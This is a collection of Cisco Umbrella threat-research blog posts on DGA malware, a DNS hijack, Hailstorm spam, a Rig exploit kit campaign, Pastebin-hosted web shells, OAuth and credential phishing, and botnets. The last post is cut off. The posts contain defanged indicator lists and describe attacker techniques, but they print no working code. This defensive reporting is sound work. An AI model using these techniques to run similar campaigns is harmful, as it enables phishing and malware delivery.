{"website": "Cisco-Umbrella", "title": "Domain Generation Algorithms – Why so effective?", "author": ["Andrea Kaiser"], "link": "https://umbrella.cisco.com/blog/domain-generation-algorithms-effective", "abstract": "Domain Generation Algorithms(DGAs) are used in malware to generate a large number of domain names that can be used in communications to the malware’s command and control servers. One reason that DGAs are used is because a predefined list of domains that will be used as Command & Control (C&C) servers can be easily discovered in the binaries of malware. An algorithm needs to be reverse engineered. Some DGAs can be completely thwarted through reverse engineering, and every possible domain name can be known and then blocked through security layers. The majority of the domain names generated by DGAs do not resolve (NXdomains) and are never registered with any hosting company by the malware author. They will however, create noise in network logs and annoy Analysts attempting to find active C&C domains. Although these requests to the NXdomains do not resolve, at OpenDNS, we still see the attempted request in our DNS query logs. Recently, I have found that analyzing these sessions of DGA requests in our logs has proven effective at surfacing other types of malicious domains that are queried in the event. Why so effective? While malware authors have found DGAs to be an effective way of hiding C&C traffic, what I’ll be talking about is how they’re effective in surfacing other related malicious infrastructure. This surfaces domains that become guilty by hanging out with the wrong crowd. If I can see that there is already some shady DGA business going on, and said domain does not match the known DGA pattern, but appears in the session, it’s worth examining. After singling out a session of DNS requests with many consecutive sudden requests to NXdomains, you will also find some resolving DGA domains. They typically only resolve for a short period of time. Amongst these resolving domains is where it becomes interesting, and becomes an effective place for hunting. Examining these domains will also give you further insight into how specific malware functions. In an identified session of Necurs DGA callouts, we can identify the first DGA round beginning with a callout to top level ‘com’ domains that are unpredictable, and used by the malware to detect simulated network traffic in order to evade analysis. [1] The 2nd and 3rd round of DGA callouts will then begin if not thought to be running in a lab environment. We find the majority of the 2nd and 3rd round DGAs to be sinkholed . uqhucsontf[.]com myypqmvzkgnrf[.]com ocufxskoiegqvv[.]com uflhdvsnjmfgcp[.]so otopshphtnhml[.]net aiygrmsryphqlkfcld[.]su etfxkiqtriteysf[.]pw crigtwrdtxbcmsgjkmx[.]tv cjyioboxmxhsmrclrhxxl[.]im soqikjyliunjqaciqlg[.]tj jrguloma[.]biz anlxccqeqflidpwyhobm[.]ir Surfacing malicious infrastructure On Oct 3rd, an interesting domain stood out amongst this DGA session; xic[.]graphics. oumulcchlccvhsb[.]la wolnltrixnidaaqaqty[.]tw awwxmmbhkpedjnycrh[.]eu kaxtnqdkxigrg[.]cx gwhhpnrfkdiedhga[.]ki sxurcsgyrnob[.]tw pmir.3g.qq1[.]com xic[.]graphics Around this date, messages were received by users on Facebook containing a link to xic[.]graphics. Reportedly, this site was installing a malicious browser extension once a user clicked an image to view a “video” contained in the message. [2] , [3] After looking at the email registrant of xic[.]graphics, we found that this account had registered numerous other domains that were being used in the same type of campaigns: lololokokokovovovo[.]com, futunga[.]com, todayonlynews[.]com, utopgames[.]com . lololokokokovovovo[.]com had a similar spike in traffic during this period as xic[.]graphics and shared the same html source code while it was live. We are currently blocking all domains registered by this email registrant; mhungetuoy@gmail[.]com. The IP address, 51.254.198[.]136 that some of these domains resolve to reveals more infrastructure belonging to the attackers. The domains seem to be involved in similar attacks and were all full of jumbled words, with Facebook image links in the source. As of this posting, some of the domains seem to be moving IPs and are now resolving to 178.32.125[.]10. The nameservers of ns1.futunga[.]com, ns2.futunga[.]com are still in use. Resolving to 178.32.125[.]10, utopgames[.]com is still hosting the same type of images used in the Facebook message campaigns of xic[.]graphics. It also has similar source code. image from utopgames[.]com image from utopgames[.]com We found some “testing” being done with JS files on various ‘pw’ TLD domains hosted on these IP addresses. The samples simply contained the word “TEST”. However, coming from this infrastructure, it is suspicious. URLs linking to JS files on PW domain Traffic spike on PW domain When sampling a portion of our DGA sessions to see which TLD’s are seen most often, the TLD ‘pw’ ranked at 0.961 (1 being the highest possible ranking.) The following ‘pw’ domains were seen resolving to the IP addresses mentioned and host similar URLs to JS files. budaner[.]pw facimago[.]pw fokelyio[.]pw kalaner[.]pw kamirop[.]pw lakonaci[.]pw lokelys[.]pw momeros[.]pw sokciso[.]pw sonbkos[.]pw sonmerahpaga[.]pw tekcise[.]pw tokciko[.]pw vslaner[.]pw", "date": "2016-10-10"},
{"website": "Cisco-Umbrella", "title": "Detecting The Recent Blockchain DNS Hijack", "author": ["Artsiom Holub"], "link": "https://umbrella.cisco.com/blog/detecting-recent-blockchain-dns-hijack", "abstract": "Cryptocurrency continues to change the world of money. Bitcoins and blockchain technology might replace traditional banking, but first it is the community who have to solve a lot of security problems. Bitcoin wallets and companies are being targeted by the criminals more and more as they face easier schemes to launder stolen funds. Traditional banks have controls to detect and prevent laundering schemes but in the crypto currency world we face bitcoin mixers that make the tracking of stolen funds a complicated challenge. It is quite a show as we watch cybercriminals find themselves victims of their own community when new attacks target bitcoin companies and wallet users. This week the DNS server records for blockchain.info and blockchain.com were hijacked. An attack of this sort is a departure from the normal uprise we’re tracking in email phishing attempts and abused advertising services to acquire user credentials. Because these DNS Hijacking attacks seem to be quite popular and effective, we have a system to monitor the records large set of popular domain names. We wrote massresolver , a simple tool leveraging libunbound to quickly and securely resolve a massive list of domain names, even with an empty cache. We detected the change in nameservers early in the morning IP addresses were changed: Company shortly discovered the issue with DNS About an hour later one of the reddit users noticed the same and posted a new thread on the bitcoin subreddit https://www.reddit.com/r/Bitcoin/comments/573lis/it_looks_like_blockchaininfo_has_been_dns_hijacked/ Both sites acknowledged that their DNS was hijacked and they were able to restore all services OpenDNS is blocking both IPs so our customers, who use bitcoins, would not be exposed to the risk. In this case no damage or hack was done to the servers of the targeted companies, but attackers were able to change DNS records to redirect users to a totally different set of machines. And controlling a domain name also allows attackers to potentially gather credentials of the wallets. So treat your bitcoin wallet as your real one, and be aware of the ongoing malicious campaigns.", "date": "2016-10-12"},
{"website": "Cisco-Umbrella", "title": "Chasing the Storm", "author": ["Andrea Kaiser"], "link": "https://umbrella.cisco.com/blog/chasing-the-storm", "abstract": "In this blog, we’ll discuss new tactics used in Hailstorm campaigns. These new tactics include infecting systems with a trojan for sending out spam, and leveraging a single system for hosting a large number of sites in which spam recipients are directed towards.  Investigating one such system, we uncovered 11,769 hostnames with 1,719 domains (2LD+TLD), each of which may serve spam content. In this analysis of the campaign we’ll combine a mixture of methods from DNS traffic analysis, malware hunting, and sandbox analysis to expand our coverage. Below you’ll find sections including: Traffic Analysis : Looking more closely at the hosting IPs popularity. Hunting : Having identified a hosting IP, we pivot through the hostnames identifying new hosting IPs and registrants. Analyzing : Statistical properties in the distribution of subdomains. Malware Analysis : Analyzing related hashes and samples. HOSTING IP POPULARITY We were first notified of the hosting IP 95.31.22[.]193 having unusual volume of popularity within the last couple days. Below is an example of what we were seeing. FIGURE: 95.31.22[.]193 popularity over the last three weeks. In this plot, along with a more raw popularity, you see a 12-hour moving average to better capture the underlying trend. Notice, what piqued our interest is the larger than normal amount of popularity to this hosting IP in the last few days. HAILSTORM DOMAINS AND HOSTNAMES This hosting IP 95.31.22[.]193 was hosting confirmed hailstorm domains. For example: vmiller.winnifredrobenia[.]win barrie.winnifredrobenia[.]win cdavila.winnifredrobenia[.]win jeffunderwood.winnifredrobenia[.]win jjefferson.winnifredrobenia[.]win kenneth.winnifredrobenia[.]win leonardperez.winnifredrobenia[.]win Note: Additional domains at the bottom of the blog. Now, these subdomains appear to be random words rather than random characters. On this hosting IP alone you’ll find 11,769 hostnames made of 1,719 domains (2LD+TLD).  Below is the distribution of the number of subdomains per domain on this hosting IP. FIGURE: Two histograms of the distribution of the number of subdomains to domains. LEFT: graph of all domains. RIGHT: graph of only domains with 5 or more subdomains (185 total domains). THE NEW STORM Once we found the hosting IP of these hailstorm domains, it was only the beginning. This domain winnifredrobenia[.]win, which we observed hosted on the IP 95.31.22[.]193 was seen sent out in email messages we observed from analyzing this trojan in a sandbox environment; SHA256: e3126968891a813103e4b9a59d31551e73535d5e4cf791da3e661413dca77e12 FIGURE: Spam email with a link to winnifredrobenia[.]win This trojan will enlist the infected host into the malicious actor’s spam botnet. This technique of sending spam from numerous network locations of infected hosts makes it difficult to stop entirely, since there is no central location of origin. The file was dropped from pubsearch[.]ru which we have seen hosted on the IP 134.119.218[.]182. This is yet another part of the Hailstorm infrastructure. This hosting IP is using the same tactic of registering many new subdomains on a daily basis. FIGURE: Example of Investigate view of 2LD and 3LD domains on hosting IP Cisco Umbrella continues to track these Hailstorm campaigns and their infrastructure through IP addresses, domains and email registrants. IOCS The below email registrants have registered domains associated with this wave of Hailstorm: bossraz@ya[.]ru veremeikom@gmail[.]com andrejn797@gmail[.]com fsn.vladimir@gmail[.]com nbelikov11@gmail[.]com radanatoliy@gmail[.]com bossraz@yandex[.]net alexstoiev123@gmail[.]com darat@xrbox[.]com A sample of IPs: 134.119.218[.]182 146.255.193[.]186 93.186.192[.]94 85.25.210[.]136 213.159.212[.]211 193.124.179[.]165 134.119.218[.]179 93.186.196[.]16 176.123.2[.]249 5.9.55[.]110 5.178.83[.]50 176.31.106[.]23 185.31.161[.]198 176.31.106[.]23 95.31.22[.]193 Hashes communicating with Hailstorm domains and IPs: d938bd8ced1534ad6939d9e168e16f62dace7194829f1ef6f326ae911ee8e9a2 e68ca920c85b7f187273c85cdd943c46aaaed057f3bf82fdcd39edb83694740b 90c31a89a9a2c402c33e2199b906768b583d0ad11a1072ad5f2e2058e992a668 e3126968891a813103e4b9a59d31551e73535d5e4cf791da3e661413dca77e12 68fd651a697119b49942381382a7646931b1eea1e0b895ebaedb0b1d5eb0fcc2 A sample of domains: www684.alanwinnifredrobenia[.]win www878.andrea.winnifredrobenia[.]win www521.arb.winnifredrobenia[.]win www563.bdeese.winnifredrobenia[.]win www585.bengel.winnifredrobenia[.]win www.casey.winnifredrobenia[.]win www274.charlesprice.winnifredrobenia[.]win www283.cristobr.winnifredrobenia[.]win www190.dmoultonwinnifredrobenia[.]win www874.dmoultonwinnifredrobenia[.]win www195.ealesmultotec.winnifredrobenia[.]win www751.hcortez.winnifredrobenia[.]win www868.ianclapp.winnifredrobenia[.]win www729.jatkins.winnifredrobenia[.]win www903.jonhunt.winnifredrobenia[.]win www459.jstevens.winnifredrobenia[.]win www821.jzhang.winnifredrobenia[.]win www476.lj.winnifredrobenia[.]win www456.lj.winnifredrobenia[.]win www457.lj.winnifredrobenia[.]win www504.lnunes.winnifredrobenia[.]win www717.mike.winnifredrobenia[.]win www935.mpennwinnifredrobenia[.]win www996.nguyenconglap.winnifredrobenia[.]win www118.nic.winnifredrobenia[.]win www746.nic.winnifredrobenia[.]win www934.nic.winnifredrobenia[.]win www911.nick.winnifredrobenia[.]win www300.obienichols.winnifredrobenia[.]win www587.paul.winnifredrobenia[.]win www828.peter.winnifredrobenia[.]win www771.pistininzi.winnifredrobenia[.]win www331.psimoslaw.winnifredrobenia[.]win www920.richardbishop.winnifredrobenia[.]win www214.roel.winnifredrobenia[.]win www310.rsbr.winnifredrobenia[.]win www336.vinnycarey.winnifredrobenia[.]win www734.vinnycarey.winnifredrobenia[.]win winnifredrobenia[.]win bill.winnifredrobenia[.]win dillingham.winnifredrobenia[.]win dkey.winnifredrobenia[.]win garywright.winnifredrobenia[.]win jakedaigle.winnifredrobenia[.]win josephhenthornwinnifredrobenia[.]win liz.winnifredrobenia[.]win makethecall.winnifredrobenia[.]win mlkgoldens.winnifredrobenia[.]win molloym.winnifredrobenia[.]win nic.winnifredrobenia[.]win ns1.winnifredrobenia[.]win ns2.winnifredrobenia[.]win pastorjeff.winnifredrobenia[.]win patrick.winnifredrobenia[.]win toolmanwinnifredrobenia[.]win vmiller.winnifredrobenia[.]win barrie.winnifredrobenia[.]win cdavila.winnifredrobenia[.]win jeffunderwood.winnifredrobenia[.]win jjeffersonwinnifredrobenia[.]win kenneth.winnifredrobenia[.]win leonardperez.winnifredrobenia[.]win matthelling.winnifredrobenia[.]win mreed.winnifredrobenia[.]win mshamimarainwinnifredrobenia[.]win pdagrandrapids.winnifredrobenia[.]win tbradford.winnifredrobenia[.]win tembos.winnifredrobenia[.]win www.winnifredrobenia[.]win yukyw.winnifredrobenia[.]win zbig.winnifredrobenia[.]win", "date": "2017-03-08"},
{"website": "Cisco-Umbrella", "title": "'Seamless' Campaign Delivers Ramnit via Rig EK", "author": ["Andrea Kaiser"], "link": "https://umbrella.cisco.com/blog/seamless-campaign-delivers-ramnit-via-rig-ek", "abstract": "The Cisco Umbrella Team has been tracking an Exploit Kit campaign that we refer to as ‘Seamless’ due to its inclusion of the now deprecated seamless iframe attribute . This campaign has been discussed indirectly in other blog posts – we’d like to shed more information on its details. In the Wild In early February, 2017 our HitList classifier identified a redirection to a known Rig Exploit Kit Gate: http://forexo-click.info/flow2[.]php to new.admastersagency[.]com We immediately blocked this domain, however, starting in March following a lull in the latter part of February, we’ve seen an increasing number of redirections to other known gates by systems hosted in the same ASNs: AS39134 and AS197695. The majority of infections we’re seeing appear to be targeted towards Canada. This may be intended by the campaign or just be an unintended result of the distribution network. You’ll notice a number of references to Canada in the URI section below. Landing Page Common in some Rig EK campaigns, an actor compromises a website to inject a malicious iframe which, unbeknownst to it’s visitors, fetches content from the exploit kit gate. The gate then profiles the user and delivers an exploit or some other malicious content. What makes this campaign slightly different is that the initial website (referred to here as a landing page, not to be confused with an EK landing page) which includes the iframe does not appear to be a compromised site. It looks to be in use for the sole purpose of delivering the iframe. This implies the campaign may be focused on malvertising or direct email links as a key method to drive traffic towards its sites. Malvertising also supports the observations in the prior report of this campaign mentioned above. These landing pages follow a few common patterns, discussed in following sections. Page Content It appears the campaign is testing the content of these landing pages. For instance, this example found on http://z-soft[.]biz/index1.php includes example code from bike guru and internet bad-boy, Sheldon Brown , but lacks the actual iframe src: While other sites are ready for production, such as this example from http://194.58.38[.]54/canadajapan.php: Root Content The root directories on some of the systems hosting landing pages include slightly more sophisticated JavaScript which grabs the timezone information from the user and posts it back to the PHP script before disclosing the gate. Here is an example from http://194.58.58[.]193/: A deobfuscated version of this same JavaScript shows that they may be using Google Analytics to track infections: In response to this POST, the user will be redirected to the PHP script via JavaScript: We saw cross-redirection between the two hosts, for example: http://194.58.58[.]193/ redirects to http://194.58.38[.]103/sploit/flow3.php http://194.58.38[.]103 redirects to http://194.58.38[.]103/sploit/flow3.php While http://194.58.58[.]193/index1.php lacks an iframe src. iframe Structure The iframe declaration is pretty white label – its positioned right after the center tag, includes zero’ed width, height and no frame border, plus the addition of the seamless attribute. This seamless attribute has been used in various exploit related content, even one instance involved in a notorious leak . However we haven’t seen it used in any recent campaigns, probably because its deprecated, which may imply this is a new effort by an old schooler or just someone who copied it from existing code. URIs We’ve observed a few different permutations of the URI for these systems: /index1.php /sploit/index1.php /canadajapan.php /flowchina.php /sploit/flow336.php /china.php /sploit/flow2.php /sploit/flow3.php /usa.php /japan.php /flowrabit.php /flow77.php Hosting Infrastructure Most of the systems found to be associated with the landing pages used by this campaign were all hosted in AS39134 and AS197695, owned by a Russian provider. While most activity was IP centric, the few domains involved also linked back to this provider. forexo-click[.]info, one of the first domains seen exhibiting these behavior, was registered a day before malicious traffic was set up on it. We observed activity on the following systems: 194.58.40[.]198 194.58.58[.]193 194.58.38[.]54 194.58.38[.]51 forexo-click[.]info z-soft[.]biz lexushireahero[.]com xn--15-mmc[.]xn--p1acf Registrant Pivoting off of the registrant for forexo-click[.]info, we came across z-soft[.]biz, which served what appeared to be a testing page containing the same landing page content without an iframe src target defined. Infection The infection chain is what you’d expect from a Rig campaign: Before the Flash object, the gate returns a page including a few strings between the script tags: The exploit achieves code execution and transfers control to the following one liner which fetches an encoded binary and runs it: The encoded binary is Ramnit, a well known banking trojan that has been grabbing headlines recently. We’ll continue to monitor the progress of this campaign and keep you up to date. In the meantime, if you have any additional information, please reach out to us (the authors of this post) on Twitter! You can find our handles on our profile pages!", "date": "2017-03-29"},
{"website": "Cisco-Umbrella", "title": "A Wretched Bin of Scum and Villainy", "author": ["Patrick Colford"], "link": "https://umbrella.cisco.com/blog/wretched-bin-scum-villainy", "abstract": "A Brief History of Pastes For more than 25 years, people looking to share computer code and snippets of text have used pastebins, web applications designed to store text. Often chosen because they would preserve formatting, pastebins were also an attractive option for IRC enthusiasts who wanted to talk about problems they were having with their programs without flooding channels with irrelevant information. 14 years ago, Pastebin (pastebin.com) was created. Created to be a global repository for code review, the site has blossomed into one of the most popular sites on the net. As of this writing, Alexa’s global rank for it was 1,100. Like so many other things on the internet however, Pastebin has been abused by malicious actors. Taking advantage of the anonymity and specificity that Pastebin prides itself on, malware authors and hacker groups use the site for a variety of purposes, including sharing stolen login credentials and credit card information, kits for compromised sites, and most recently to host malware samples and complete malware chains. The site’s status as a data dump is well known, so let’s look at some of its other uses. How To Compromise Websites and Influence People The vast majority of content on Pastebin is benign. Plenty of users share legitimate snippets of code on it, everything from router firmware to online shopping carts. Though there’s plenty of other content that has little to do with computing or computer code, most of what is on Pastebin are pieces of scripts or programs, shared with the intention of helping anyone who needs it. The shadier side of Pastebin is still interested in helping people, but it’s more interested in helping people abuse vulnerabilities and compromised websites. Hacker groups will use Pastebin to share their defacing code. IndoXploit, a hacking group operating for at least a year, hosts a good deal of their scripts under the Pastebin user account named “Tu5 b0l3d”, presumably the same user on the IndoXploit forums and YouTube channel . The Pastebin account of “Tu5 b0l3d”, a member of the INdoXploit team Not all groups are so brazen, but the need to share is compelling all the same. Here, we see the PHP for a r57/c99 shell hidden behind an anonymous account: c99 shell on Pastebin c99 shells are for use by malicious actors when they’ve compromised a domain’s server. Acting as a backdoor, a c99 shell lets malicious users navigate the compromised domain, grants file and password access, and comes with a host of other tools. c99 shell distributed on Pastebin Umbrella Investigate graph for r57c99[.]com As seen in the graph above, Pastebin’s views on individual pastes aren’t a great indicator of the malicious actor’s success or failure. Though anonymity is one of Pastebin’s key features, the ability to store multiple copies of the same code must also be seen as an advantage for malicious actors: if a URL proxy cuts off access to one instance of your malicious paste, you may have dozens more lying in wait. Hidden in Plain Sight Beyond offering compromising scripts and compromised accounts, Pastebin has recently become a vector for malware attacks itself. Malware authors are using the site to host obfuscated code samples, usually encoded in Base64 (https://pastebin.com/nxd1fahr), but we’ve also seen examples in binary (https://pastebin.com/h3YpJvwp) as well as hex (https://pastebin.com/3J4EvhtL). These obfuscated samples are called by compromised websites in order to complete the kill chain: When a user accesses the compromised site, the site quietly makes a request to specific Pastebin URLs which then execute. The victim doesn’t need a Pastebin login (or even to know what Pastebin is), and the pastes can be set to remove themselves after a given amount of time. The small URLs pastebins employ in order to make sharing easier adds another problem for security professionals by making Twitter a particularly effective medium for infection and propagation. Used to distribute commands and code, the social media platform becomes another tool bent towards malicious purposes. Because of the website’s popularity and ease of use, tens of thousands of pastes are added per day. Administrators might be hesitant to block the domain because of its utility, but malicious actors have been abusing it for years. The earliest blogs about this technique are two years old , and similar services such as Github’s Gist or Ideone are just as vulnerable to the underlying problems. Any service in which anonymous users can host code indefinitely is going to be a double-edged sword, and one that security professionals must be mindful of allowing.", "date": "2017-04-14"},
{"website": "Cisco-Umbrella", "title": "Detecting the Google Docs Phishing Attack Using Traffic Analysis", "author": ["Brad Antoniewicz"], "link": "https://umbrella.cisco.com/blog/detecting-google-docs-phishing-attack-using-traffic-analysis", "abstract": "The massive phishing attack disguising itself as a Google Docs sharing request is dominating headlines. We’re proud to say that our Sender Rank algorithm detected the attack before the blogs began to roll! Not only that, our unique perspective gives us insight into how successful the attack was. While most reports are looking at the email content itself, our focus is on network traffic, so let’s look there to see the staggering impact of the attack and what Sender Rank looked at to catch it. Timeframe and Domains Our data shows the attack was mainly concentrated between 2017-05-03 18:00:00 and 2017-05-03 19:00:00, consisting of the following domains that share the lexical attributes doc and cloud among them: gdocs[.]pro gdocs[.]win g-docs[.]pro g-docs[.]win docscloud[.]win docscloud[.]info gdocs[.]download g-cloud[.]pro g-cloud[.]win docscloud[.]download These domains had another common characteristic: a sharp increase in traffic volume. Further, the volume of traffic for these domains happened as most spam does: i.e. early in the morning and typically blasted. Below is an example ( g-docs[.]win ) of how the domain is dormant, with little or no query volume, prior to its release: Domain volume to g-cloud[.]win domain. The Click The phishing email contains an ‘Open in Docs’ button, which when clicked, sends the user to Google’s OAuth page for authentication and to grant permissions to the victim’s account. In the email we looked at, the URL assigned to the button click contained a redirect parameter, which, once allowed or denied at Google’s OAuth page, would redirect the user to an attacker-controlled website. As identified by our Sender Rank algorithm and confirmed in other articles, the domains listed above were found to be used in this attack, and likely the value of this redirect parameter. Impact The button and the redirect sequence is particularly noteworthy since, in our testing, the user needs to click the ‘Open in Docs’ button, then either click ‘Allow’ or ‘Deny’ on Google’s OAuth page to contact one of these domains. There also were reports of other variants of the phish that just had a link to the attacker-controlled system. Regardless of how many steps it takes for the user to arrive at the attacker-controlled site, the fact that they always need to click something first makes the query volume particularly staggering. For instance, if we just look at four of the ten domains, we see an approximate average of 15,000 queries: Query Volumes 10 domains averaging 15,000 queries might suggest an upwards of 150,000 of our users actually clicked ‘Open in Docs’. Now, it’s hard to say how many users were affected using DNS data alone. Each DNS query does not equate to a single person, compromise, or even system. Nor does a DNS query mean that the system which queried the domain did so as a result of this attack. That being said, even if the actual number was 1/10th of the query count (which, as we’ll show shortly, is more likely the case), it is still staggering to think that many people let their guard down and clicked away. Sender Rank Like all our models, Sender Rank provides visibility into what makes these attacker domains unique. For example, the queries to the attacker-controlled domains were at the same rate as some of the most popular and trusted sites on the internet: apple.com , travelocity.com , and salesforce.com ! The following section will break down some of the behavioral attributes that Sender Rank used to detect these attacker domains. Machine Behavior A unique perspective we have in attacks like this is the ability to identify the behavior patterns within the queries made to the domains in the campaign. One interesting question you might ask is, what other malicious domains were being queried during the same time frame as these? In the following charts, we highlight a few aggregated metrics that give insight into the domains used in this attack. First, we can see that there were approximately 1,200 machines querying the three domains at the peak of the attack . This gives us a little more clarity to the impact. The interesting thing here is that machine count was sustained for roughly two hours, then saw a rapid decline in the 3rd hour (a 95% decrease on average). The number of machines querying these domains As we alluded to previously, we can also characterize simultaneous queries over the attack time frame. In other words, we can identify if these attacker domains caused additional queries outside of the norm. In the below chart we report the median number of unique queries made in the same hour (we use the median, rather than mean, due to outliers). The median number of unique queries occurring in the same hour as those made to the attacker controlled domains. We observe about 100 (or so) unique queries were simultaneously made during the time of the attack. This is an interesting comparison to the first chart since here we don’t see a decline in the 3rd hour of the attack. The Email Server Ripple Email servers will often use internet-based block list services when evaluating messages for spam and malicious content. Similar to Sender Rank, email block lists have the ability to aggregate and collate the reactions of a horde of mail servers, giving them a perspective that allows them to recognize large broad campaigns. In the following table, we show the percentage change in the block list volume for the attacker controlled domains . Domain 2017-05-03 18:00:00 2017-05-03 19:00:00 docscloud[.]win 509% 4.7% g-cloud[.]win 537% 1.8% g-docs[.]win 509% -31.4% TABLE 1: Percent change from one hour to the next. To provide additional context, here are a few other domains Sender Rank is tracking (not blocking) with same popularity: bhphotovideo.com googlegroups.com travelocity.com salesforce.com hollisterco.com tumblr.com weebly.com icloud.com blogspot.com office365.com eventbrite.com apple.com Conclusion This attack used a common approach to target users accounts in an unsuspecting way and had a staggering impact. We’ll continue to build systems like Sender Rank to quickly detect the next attacks, protect our customers, and keep you informed!", "date": "2017-05-04"},
{"website": "Cisco-Umbrella", "title": "Behind the Scenes of a Phishing Campaign", "author": ["Brad Antoniewicz"], "link": "https://umbrella.cisco.com/blog/behind-scenes-phishing-campaign", "abstract": "Even though the Phishing campaigns we observe in the wild vary widely in sophistication, there is always something to learn from each of them.  We continually come across this one campaign and thought it might be nice to finally dive in and share what we’re seeing. We also came across a few server side artifacts that give deeper insight into the campaign. The Boring Phish To most security professionals, the landing page in the image to your right is the equivalent to a dark alley in a bad neighborhood. The lack of branding, obscurity of the request, and conspicuous disregard for subtlely makes this a classic phishing attempt. In some ways, it is hard to believe anyone would fall for a page like this. However, campaigns using similar landing pages have been occurring for over a year, which implies there must be some return on the attacker’s investment that makes these campaigns worthwhile. URIs and Redirections There is a very clear structure here: the URIs commonly contain an index.php with an email parameter. Upon submission, a POST request is made to post.php which in turn will redirect the user to a thankyou.php. Note though, that the redirect is not always present. The complete path of these PHP files vary from infected site and there have been a few cases in which the index.php and post.php are on different systems. /user/index.php?email=email@email.com /smg/mailbox/domain/index.php?email=email@email.com /images/themes/mail/mail/index.php?email=email@email.com /sean/index.php?email=email@email.com Server Side Code post.php is responsible for receiving the email address and user-provided password from the HTML form with index.php and passing it to the attacker. A simple email is used here to deliver the harvested credentials to the attacker’s email box. Let’s check out the code: There are a few interesting lines here, that we’ll dive into in the upcoming sections. GeoLocation The first lines retrieve the visitor’s IP address then use an IP GeoLocation service to determine its city. This code clearly looks under development as the url variable is redefined, with the first definition setting the URL of country endpoint and its redefinition changing to the city endpoint. It’s also worthwhile to note that API key is bound by the provider to a specific email address and server IP, as shown in the screenshot from the service provider’s website to the right. This suggests the attacker is customizing these landing pages per campaign. Subject Line This campaign may have targeted Chinese users given the subject of the email which is sent to the attacker. There is also what looks to be a version string containing a date. If it is a date, it is much further in the past than when the attack was active. Recipients Three email addresses are listed as recipients of harvested credentials. This could be for redundancy purposes or perhaps there are three individuals involved in the collection of these domains. Multiple Campaigns These phishing landing pages often live on servers with an out of date CRM like WordPress or Joomla. Since so many people are scanning the internet for vulnerable sites like these, it’s not uncommon to see evidence of multiple campaigns. In this instance, we counted three different campaigns on just one server. A secondary site mimicked the original with one small change: In this instance, the attacker is redirecting to another site, bhp[.]pt, instead of the post.php located on the server. These are so common that a quick search for “confirm your account to upgrade your mailbox” will return in a handful of instances. The DHL Phish On the same server, a slightly more sophisticated campaign was targeting DHL users. The entire page, images and all, were part of a single HTML file that redirected users to a secondary server. In addition to this redirection, there is also evidence that suggests the two sites may be working together on other campaigns. The same directory structure, leading to the same phishing page were found: original_site/sys/upgrade page/Aldomain/mailbox/domain/index.php skbizcorp[.]com/4/upgrade page/Aldomain/mailbox/domain/index.php The Collector Another, much more professionally written form collector was also found but not directly exposed through any of the other pages, indicating that the corresponding form that POSTs to it was hosted on another system. You can see here that the attacker opted against an IP Geolocation service that required registration, and had generally neater coding style. The author credited in the collector is ‘Techroins’. Web Shells and Utilities! As common with vulnerable CRMs, you’ll find a few different web shells in various directories. Some are password protected while others wide open. One of the more basic but not so common ones allows for arbitrary file upload, which surely comes in handy when uploading phishing pages: A PHP Mailer also helps here, giving the attackers the ability to spam out more attacks. This one writes its content to a text file before sending out, so it may also be possible to see the last phish the attacker sent: We’ll continue to watch out for these bad guys so you don’t have to! Enjoy!", "date": "2017-11-20"},
{"website": "Cisco-Umbrella", "title": "Deprecating Support for TLS 1.0 / 1.1 – Improving Encryption Strength and your Security Posture", "author": ["Adam Callis"], "link": "https://umbrella.cisco.com/blog/deprecating-support-for-tls-1-0-1-1-improving-encryption-strength-and-your-security-posture", "abstract": "TLS Background Transport Layer Security or TLS provides privacy and data integrity for applications communicating over the Internet. It can be used in many Internet services today such as VPN, Email Exchange, and most commonly , Web Services (HTTPS). There have been 2 released versions of Secure Sockets Layer (SSL) and 4 versions of TLS spanning the last 25 years of security advancements. Each successive release addresses security vulnerabilities or weaknesses in a prior release : SSLv2 documented in RFC 6176, released in 1995 SSLv3 documented in RFC 6101, released in 1996 TLS1.0 documented in RFC 2246, released in 1999 TLS1.1 documented in RFC 4346, released in 2006 TLS1.2 documented in RFC 5246, released in 2008 TLS1.3 documented in RFC 8446, released in 2018 Current TLS Support Our mission within Cisco Umbrella has always been to provide powerful security solutions that are easy to deploy and simple to manage. To maintain the simplicity for our customers and provide for the most backwards compatibility for those running legacy or unpatched operating systems, Cisco Umbrella has previously chosen to continue supporting all TLS Protocols 1.0 or later, deprecating only specific weak / insecure ciphers. What’s Changing? Cisco Umbrella will deprecate support for all TLS / SSL versions prior to version 1.2 on March 31 st , 2020. After this date customers will be unable to connect without leveraging a TLS1.2 compatible client. Why change now? There are a few compelling events that caused us to re-evaluate our risk evaluation of TLS 1.0 / 1.1. 1 – Apple, Google, Microsoft, and Mozilla announced in October of 2018 that they will deprecate support for TLS1.1 and prior within their browsers , forcing all TLS communications to be TLS1.2 or higher on March 31 st , 2020. 2 – As of June 2018, the Payment Card Industry Security Standards Council (PCI-SSC) officially began enforcement of a new policy requiring any sites certified under PCI-DSS to deprecate TLS1.0 and any SSLv2/v3 configurations. While they will allow TLS1.1, there is a strong recommendation to implement only TLS1.2 and later protocols. 3 – As of 2014, the National Institute of Standards and Technology (NIST) formalized policy 800-52 which requires US Government Agencies to adopt TLS1.2 and deprecate use of TLS1.1 and before. Upon re-evaluation of the associated risks and certification landscape, Cisco determined that now is the time to complete deprecations for anything prior to TLS1.2.", "date": "2019-09-06"},
{"website": "Cisco-Umbrella", "title": "Behind the Modern Botnet", "author": ["Andrea Kaiser"], "link": "https://umbrella.cisco.com/blog/behind-modern-botnet", "abstract": "Earlier this month, I was fortunate enough to be able to speak at the very first BSides Amsterdam . I shared some insight on botnets and the malicious infrastructure behind them, seen from analyzing DNS traffic through Cisco Umbrella’s resolvers. Botnets enable the spread of malware and fuel the infrastructure behind cyber crime. Once a cyber criminal is in control of a network of infected systems, they have the means to start spreading large amounts of malware, gaining access to private systems, and gaining resources for use in DDOS attacks. Analyzing botnet IOCs can reveal previously unseen malicious indicators by pivoting off of domain names, name servers, and IP addresses. We’re going to show a few examples in this blog post of threat hunting using this technique. We’ll also highlight the different stages of an infected system as it’s used as part of a botnet. Lifecycle of a Bot The Infection and Spreading stage is when a threat actor begins the means in which they will get their malware onto systems, into email boxes, or setup for hosting malvertising or malicious code on websites. Systems already remotely controlled as part of a botnet are often rented out for a nominal fee. This allows an attacker to rent the use of an infected system in order to use its shared connections within the botnet to drop and propagate a malware payload of their choice. Infected systems that are able to send email can be used to send spam to new systems with the attackers malicious payload as the attachment or include an obfuscated URL in the email text leading to a website hosted by the attacker which will drop the malware payload. During the Command and Control (C2) Contact or Rallying stage, a bot will attempt to make contact with the attackers C2 server to alert on a successful infection. Domain and IP fast flux is typically used at this time. The C2 server will frequently change it’s hosting IP address(es) 